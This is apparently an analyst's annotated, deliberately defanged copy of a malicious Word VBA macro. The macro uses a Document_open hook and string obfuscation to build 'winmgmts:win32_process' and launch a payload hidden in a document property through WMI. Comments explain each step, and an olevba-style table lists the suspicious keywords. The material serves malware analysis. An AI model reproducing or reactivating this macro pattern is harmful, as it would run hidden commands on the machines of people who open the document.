ATTENTION: harmfull code -> do not execute 


- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_open_XX()
' StartFunction()
startFuncWithoutLabels()
End Sub


Function startFuncWithoutLabels()
    inputStringAA = "DUMMYCODETOENSUREITWILLNOTWORK" + "wx [ sh binx [ sh bmx [ sh bgmx [ sh btx [ sh bx [ sh b" + "x [ sh bx [ sh bsx [ sh bx [ sh b" _ 
    + "x [ sh b:wx [ sh bx [ sh binx [ sh b3x [ sh b2x [ sh b_x [ sh b" + "x [ sh bpx [ sh b" _ 
    +  "x [ sh brox [ sh bx [ sh bcex [ sh bsx [ sh bsx [ sh bx [ sh b"

    creatObInput = funcAAA(inputStringAA) ' winmgmts:win32_process
    Set win32Process = CreateObject(creatObInput)

    'skuwd = Ga63a6ozyok1lu + Tvh1u8793dltn9.Content + P74x_w06z8wy
    skuwd = Tvh1u8793dltn9.Content  ' other variables are empty

    njcnja = Mid(skuwd, (1 + 1 + 1 + 1), Len(skuwd)) ' cuts first few characters
    nnjasd = funcAAA(njcnja)  ' does a simple replace ...

    win32Process.Create nnjasd, Koy_r2oxzs1, X2yj58n39t50co

End Function

Function funcAAA(paramStringA)
    ' basically returns value of function b
    funcAAA = funcBBB(paramStringA)
End Function


Function funcBBB(inputString)
    funcBBB = Replace(inputString, "x [ sh b", Zi0fdg4qf12t) 'returns winmgmts:win32_process when fed with main string
End Function


' +----------+--------------------+---------------------------------------------+
' |Type      |Keyword             |Description                                  |
' +----------+--------------------+---------------------------------------------+
' |AutoExec  |Document_open       |Runs when the Word or Publisher document is  |
' |          |                    |opened                                       |
' |Suspicious|Create              |May execute file or a system command through |
' |          |                    |WMI                                          |
' |Suspicious|CreateObject        |May create an OLE object                     |
' |Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
' |          |                    |used to obfuscate strings (option --decode to|
' |          |                    |see all)                                     |
' +----------+--------------------+---------------------------------------------+
'|Base64    |'li\x1c'         |sadsaccc                                     |
'|String    |                    |                                             |
'|Base64    |'\x1d\x1c'      |sasdsacc                                     |
'|String    |                    |                                             |
'+----------+--------------------+---------------------------------------------+







